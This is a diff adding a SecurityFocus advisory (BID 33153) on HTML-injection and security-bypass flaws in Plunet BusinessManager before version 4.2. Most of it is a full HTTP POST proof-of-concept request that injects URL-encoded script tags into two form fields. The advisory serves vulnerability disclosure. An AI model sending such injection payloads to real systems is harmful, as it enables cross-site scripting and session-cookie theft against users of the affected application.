@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/33153/info
+
+Plunet BusinessManager is prone to multiple security-bypass and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, control how the site is rendered to the user, or perform unauthorized actions as another user; other attacks may also be possible.
+
+Versions prior to BusinessManager 4.2 are vulnerable.
+
+POST /pagesUTF8/auftrag_allgemeinauftrag.jsp HTTP/1.1
+Host: <HOSTNAME> or IP
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) 
+Gecko/20080718
+Ubuntu/8.04 (hardy) Firefox/2.0.0.16
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,
+text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/pagesUTF8/auftrag_allgemeinauftrag.jsp
+Cookie: JSESSIONID=0B1347DFFD031E6BC1944C381A31293D
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1085
+
+TokenUAID=42&QUK=1449&QUKA=*&QUKANSCH=820&QUKLIEFANSCH=820&QUZ=sample&
+VorlageID=3&QU02=1-&QUL=sample&QUB=%22%3E%3Cscript%3Ealert%28%22XSS2%22%29
+%3B%3C%2Fscript%3E&QUG=sample&OSPK01=141&OSPK02=0&OSSK05=&OSSK09=1&PJ12=14
+&DATAUFTT=07&DATAUFMM=01&DATAUFJJJJ=2008&DATLIEFTT=24&DATLIEFMM=01&
+DATLIEFJJJJ=2008&DATLIEFHH=&DATLIEFMN=&PJ13=&
+Bez74=%22%3E%3Cscript%3Ealert%28%22XSS4%22%29%3B%3C%2Fscript%3E&
+LDate74TT=24&LDate74MM=01&LDate74JJJJ=2008&LDate74HH=13&
+LDate74MN=00&BOXP74=4&REA01774=59&REA01874=sample&
+OutPE0174=0&OutPAP74=8385&Bem74=sample&REA001=&REA010=&REA007=1&REA008=2&
+REA011=0&REA013=0&REA015=0&LEISTung=sample&LangFlag=&exit=&SelectTab=
+&ContentBox=&OpenContentBox=&LoginPressed=false&SaveButton=true&
+CheckXYZ=Send&yOffsetScroll=0
